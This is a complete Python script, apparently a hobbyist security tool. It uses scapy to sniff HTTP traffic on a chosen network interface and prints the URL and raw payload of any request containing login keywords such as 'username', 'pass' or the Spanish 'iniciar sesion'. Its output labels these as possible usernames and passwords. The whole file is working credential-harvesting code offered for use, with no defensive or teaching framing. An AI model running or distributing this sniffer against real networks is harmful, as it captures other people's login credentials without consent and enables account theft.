import scapy.all as scapy
from scapy_http import http
import argparse

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--interface', dest="Interface", help="Specify an interface to capture packets from")
    options = parser.parse_args()
    
    if not  options.Interface:
        parser.error('[-] please specify a value for the interface, enter --help for more info')
    
    return options

def sniff(interface):
    print('[*] version 1.0')
    print('[+] Initializing in the interface '+str(interface))
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = geturl(packet)
        logininfo = get_logininfo(packet)

        if logininfo:
            print("[+] HTTP Request > " +str(url))
            print ('\n [+] Possible username and password '+str(logininfo)+'\n')

def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_logininfo(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['login','LOGIN','Login','Iniciar Sesion','inicio de sesion', 'iniciar sesion', 'username','user','pass', 'password']

        try:
            for keyword in keywords:
                if keyword in load.decode('utf8'):
                    return load
        except Exception as err:
            print(err)


options = get_interface()
sniff(options.Interface)
